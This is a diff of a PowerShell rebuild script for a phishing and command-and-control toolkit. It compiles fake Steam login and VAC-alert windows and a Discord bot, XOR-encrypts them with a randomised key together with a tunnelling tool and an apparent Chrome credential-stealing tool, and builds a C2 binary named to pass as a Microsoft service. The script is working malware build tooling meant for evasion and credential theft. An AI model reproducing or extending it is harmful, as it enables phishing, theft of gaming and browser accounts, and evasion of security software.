@@ -1,54 +1,47 @@
-# full_rebuild.ps1 - Complete Phish Toolkit Build Pipeline
-# ---------------------------------------------------------
-# This script recompiles all Python modules, encrypts them, 
-# and builds the final C2 executable (EdgeUpdateSvc.exe).
-
+# Vanguard C2 Full Rebuild Script
 $ErrorActionPreference = "Stop"
 
 Write-Host "[*] Phase 1: Cleaning up old processes..." -ForegroundColor Cyan
-try { taskkill /F /IM EdgeUpdateSvc.exe /T /FI "STATUS eq RUNNING" 2>$null } catch {}
-try { taskkill /F /IM SteamLogin.exe /T /FI "STATUS eq RUNNING" 2>$null } catch {}
-try { taskkill /F /IM SteamAlert.exe /T /FI "STATUS eq RUNNING" 2>$null } catch {}
+try { Stop-Process -Name "MicrosoftManagementSvc" -Force -ErrorAction SilentlyContinue } catch {}
+try { Stop-Process -Name "python" -Force -ErrorAction SilentlyContinue } catch {}
+
+# Clear old artifacts
+Remove-Item -Path "dist", "build", "SteamLogin.spec", "discord_bot.spec" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "bin", "obj" -Recurse -Force -ErrorAction SilentlyContinue
 
 Write-Host "[*] Phase 2: Compiling Python modules to EXE (PyInstaller)..." -ForegroundColor Cyan
+pyinstaller --noconfirm --onefile --windowed --icon="resources\steam.ico" --name "SteamLogin" "login\main_ui.py"
+pyinstaller --noconfirm --onefile --windowed --icon="resources\discord.ico" --name "discord_bot" "websocket\discord_bot.py"
+pyinstaller --noconfirm --onefile --windowed --name "SteamAlert" "okoshko\steam_notice.py"
 
-# 2.1 Steam Login
-Write-Host "    -> Compiling Steam Login (main_ui.py)..." -ForegroundColor White
-pyinstaller --onefile --icon=login\steam.ico --name=SteamLogin `
-    --add-data "login\steam_ui.html;." `
-    --add-data "login\logo.png;." `
-    --add-data "login\image.png;." `
-    --add-data "login\steam.ico;." `
-    login\main_ui.py
-Move-Item -Path "dist\SteamLogin.exe" -Destination ".\SteamLogin.exe" -Force
+Write-Host "[*] Phase 3: Binary Encryption (Dynamic XOR)..." -ForegroundColor Cyan
+$XorKey = Get-Random -Minimum 1 -Maximum 254
+Write-Host "    [+] Generated dynamic XOR key: 0x$($XorKey.ToString('X2'))" -ForegroundColor Green
 
-# 2.2 Steam Alert (VAC)
-Write-Host "    -> Compiling Steam Alert (steam_notice.py)..." -ForegroundColor White
-pyinstaller --onefile --icon=okno\steam.ico --name=SteamAlert `
-    --add-data "okno\steam.ico;." `
-    okno\steam_notice.py
-Move-Item -Path "dist\SteamAlert.exe" -Destination ".\SteamAlert.exe" -Force
+$ConstantsPath = "defense\Constants.cs"
+$Content = Get-Content $ConstantsPath
+$NewContent = $Content -replace 'public const byte RESOURCE_XOR_KEY = 0x[0-9A-F]{2};', "public const byte RESOURCE_XOR_KEY = 0x$($XorKey.ToString('X2'));"
+Set-Content $ConstantsPath $NewContent
 
-# Cleanup PyInstaller clutter
-Remove-Item -Path "build" -Recurse -ErrorAction SilentlyContinue
-Remove-Item -Path "dist" -Recurse -ErrorAction SilentlyContinue
-Remove-Item -Path "*.spec" -ErrorAction SilentlyContinue
+function Invoke-XorEncryption {
+    param([string]$FilePath, [byte]$Key)
+    $Bytes = [System.IO.File]::ReadAllBytes($FilePath)
+    for ($i = 0; $i -lt $Bytes.Count; $i++) { $Bytes[$i] = $Bytes[$i] -bxor $Key }
+    [System.IO.File]::WriteAllBytes($FilePath, $Bytes)
+}
 
-Write-Host "[*] Phase 3: Binary Encryption (XOR 0xAA)..." -ForegroundColor Cyan
-$files = @("SteamAlert.exe", "SteamLogin.exe")
-$key = 0xAA
-
-foreach ($file in $files) {
+$FilesToEncrypt = @("dist\SteamLogin.exe", "dist\discord_bot.exe", "dist\SteamAlert.exe", "tools\bore.exe", "tools\chromelevator.exe")
+foreach ($file in $FilesToEncrypt) {
     if (Test-Path $file) {
-        $bytes = [IO.File]::ReadAllBytes("$PWD\$file")
-        for ($i = 0; $i -lt $bytes.Length; $i++) {
-            $bytes[$i] = $bytes[$i] -bxor $key
-        }
-        $outFile = $file.Replace(".exe", ".bin")
-        [IO.File]::WriteAllBytes("$PWD\$outFile", $bytes)
-        Write-Host "    [+] Encrypted $file -> $outFile" -ForegroundColor Green
-    } else {
-        Write-Error "CRITICAL: $file not found after compilation!"
+        $binFile = $file -replace "\.exe", ".bin"
+        Move-Item -Path $file -Destination $binFile -Force
+        Invoke-XorEncryption -FilePath $binFile -Key $XorKey
+        Write-Host "    [+] Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
+        
+        # Sync to root for C# embedding
+        $rootBin = Join-Path $PSScriptRoot (Split-Path $binFile -Leaf)
+        Copy-Item -Path $binFile -Destination $rootBin -Force
+        Write-Host "    [+] Synced to root: $(Split-Path $rootBin -Leaf)" -ForegroundColor Gray
     }
 }
 
@@ -56,18 +49,21 @@ Write-Host "[*] Phase 4: Building C# C2 (NativeAOT)..." -ForegroundColor Cyan
 dotnet publish -c Release -r win-x64 -p:PublishAot=true --nologo
 
 if ($LASTEXITCODE -eq 0) {
-    $FinalExe = ".\bin\Release\net8.0-windows\win-x64\publish\EdgeUpdateSvc.exe"
     $PublishDir = ".\bin\Release\net8.0-windows\win-x64\publish\"
+    $FinalExe = Join-Path $PublishDir "MicrosoftManagementSvc.exe"
     
-    # Ensure GlobalLogger.py is in the same directory for startup
     if (Test-Path "GlobalLogger.py") {
         Copy-Item -Path "GlobalLogger.py" -Destination $PublishDir -Force
-        Write-Host "[+] GlobalLogger.py copied to publish directory." -ForegroundColor Green
+    }
+
+    if (Test-Path "tools\bore.bin") {
+        $ToolsDest = Join-Path $PublishDir "tools"
+        New-Item -ItemType Directory -Path $ToolsDest -ErrorAction SilentlyContinue
+        Copy-Item -Path "tools\bore.bin" -Destination $ToolsDest -Force
     }
 
     Write-Host "`n[SUCCESS] Full rebuild complete!" -ForegroundColor Green
     Write-Host "[+] Binary location: $FinalExe" -ForegroundColor Green
-    Write-Host "[!] Size: $([math]::Round((Get-Item $FinalExe).Length / 1MB, 1)) MB" -ForegroundColor White
 } else {
     Write-Error "C# Build FAILED!"
 }
